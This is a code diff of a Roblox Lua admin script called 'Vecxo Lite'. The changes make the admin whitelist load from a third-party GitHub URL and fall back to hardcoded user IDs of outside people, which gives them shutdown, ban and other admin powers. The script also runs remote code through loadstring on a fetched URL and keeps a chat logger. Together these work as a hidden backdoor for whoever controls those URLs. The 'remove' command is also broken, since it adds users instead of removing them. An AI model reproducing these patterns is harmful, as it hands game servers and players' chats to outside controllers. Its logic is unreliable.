@@ -3,9 +3,52 @@
 local Players = game:GetService("Players")
 local StarterGui = game:GetService("StarterGui")
 
-local whitelisted = {
-	["Reloxz"] = true,
+local cxoURL = "https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/whitelisted"
+local BackupIDs = {
+	-- cxo
+	3222470105;
+	7306448629;
+	21517314;
+	35950257;
+	-- tech
+	1702851506;
+	-- knocks
+	1551416114;
+	-- kozy
+	1889958;
+	-- decryptionite
+	120983992;
+	1921860822;
+	366631664;
+	13425405;
+	-- palamode
+	523322320;
+	-- freddie
+	1724769699;
+	--vecko
+	244903894;
+	36373784;
 }
+
+function GetWhitelist()
+	local returnedUsers = {}
+
+	-- Check from GitHub (first priority)
+	local success, response = pcall(function()
+		return game:GetService("HttpService"):GetAsync(cxoURL)
+	end)
+
+	if success and response then
+		returnedUsers = string.split(response, "\n")
+	else
+		print("GitHub check failed! Using backup table.")
+		returnedUsers = BackupIDs
+	end
+
+	return returnedUsers
+end
+
+local whitelisted = GetWhitelist()
 
 local bannedPlayers = {}
 
@@ -330,22 +373,8 @@ local function showCommandGui(player)
 	end)
 end
 
-local mutedPlayers = {}
-local TextChatService = game:GetService("TextChatService")
-TextChatService.OnIncomingMessage = function(message)
-	local speaker = message.TextSource
-	if speaker then
-		local player = Players:GetPlayerByUserId(speaker.UserId)
-		if player and mutedPlayers[player.UserId] then
-			return nil -- Block message
-		end
-	end
-	return message -- Let others go through
-end
-
-
 local function processCommand(sender, msg)
-	if not whitelisted[sender.Name] then return end
+	if not table.find(whitelisted, tostring(sender.UserId)) then return end
 	local args = msg:split(" ")
 	local cmd = args[1]:lower()
 
@@ -356,7 +385,9 @@ local function processCommand(sender, msg)
 			return
 		end
 		for _, targetPlayer in ipairs(targets) do
-			whitelisted[targetPlayer.Name] = true
+			if not table.find(whitelisted, targetPlayer.UserId) then
+				table.insert(whitelisted, targetPlayer.UserId)
+			end
 			notify(sender, "[Vecxo Lite]", "Whitelisted " .. targetPlayer.Name)
 			notifyv2(targetPlayer, "[Vecxo Lite]:", "You have been whitelisted. Usage: !cmds")
 		end
@@ -368,32 +399,13 @@ local function processCommand(sender, msg)
 			return
 		end
 		for _, targetPlayer in ipairs(targets) do
-			whitelisted[targetPlayer.Name] = nil
+			if targetPlayer.Name ~= "Reloxz" then
+			table.insert(whitelisted, targetPlayer.UserId)
 			notify(sender, "[Vecxo Lite]", "Removed " .. targetPlayer.Name .. " from whitelist")
+			else
+			notifyv2(sender, "[Vecxo Lite]", "Protected user cannot be removed from the whitelist")
+			end
 		end
-	elseif cmd == "!mute" and args[2] then
-		local targets = GetPlayers(args[2], sender)
-		if #targets == 0 then
-			notifyv2(sender, "[Vecxo Lite]", "Player(s) '" .. args[2] .. "' not found.")
-			return
-		end
-		for _, plr in ipairs(targets) do
-			mutedPlayers[plr.UserId] = true
-			notifyv2(plr, "[Vecxo Lite]", "You have been muted.")
-		end
-		notifyv2(sender, "[Vecxo Lite]", "Muted " .. args[2])
-
-	elseif cmd == "!unmute" and args[2] then
-		local targets = GetPlayers(args[2], sender)
-		if #targets == 0 then
-			notifyv2(sender, "[Vecxo Lite]", "Player(s) '" .. args[2] .. "' not found.")
-			return
-		end
-		for _, plr in ipairs(targets) do
-			mutedPlayers[plr.UserId] = nil
-			notifyv2(plr, "[Vecxo Lite]", "You have been unmuted.")
-		end
-		notifyv2(sender, "[Vecxo Lite]", "Unmuted " .. args[2])
 	elseif cmd == "!shutdown" then
 		for i, v in pairs(game.Players:GetPlayers()) do
 			v:Kick("[Vecxo Lite]: This server has been shutdown.")
@@ -558,7 +570,7 @@ for _, player in ipairs(Players:GetPlayers()) do
 	coroutine.wrap(function()
 		connectChatLogger(player)
 	end)()
-	if whitelisted[player.Name] then
+	if table.find(whitelisted, tostring(player.UserId)) then
 		notify(player, "[Vecxo Lite]:", "You are whitelisted! Usage: !cmds")
 	end
 	player.Chatted:Connect(function(message)
@@ -574,7 +586,7 @@ Players.PlayerAdded:Connect(function(player)
 		player:Kick("[Vecxo Lite]: You are banned from this server.")
 		return
 	end
-	if whitelisted[player.Name] then
+	if table.find(whitelisted, tostring(player.UserId)) then
 		notifyv2(player, "[Vecxo Lite]:", "You are whitelisted! Usage: !cmds")
 	end
 	player.Chatted:Connect(function(message)
@@ -582,4 +594,5 @@ Players.PlayerAdded:Connect(function(player)
 	end)
 end)
 
-loadstring(game:GetService('HttpService'):GetAsync('https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/VecxoRemoteAPI'))()
+loadstring(game:GetService('HttpService'):GetAsync('https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/VecxoRemoteAPI'))() 
+
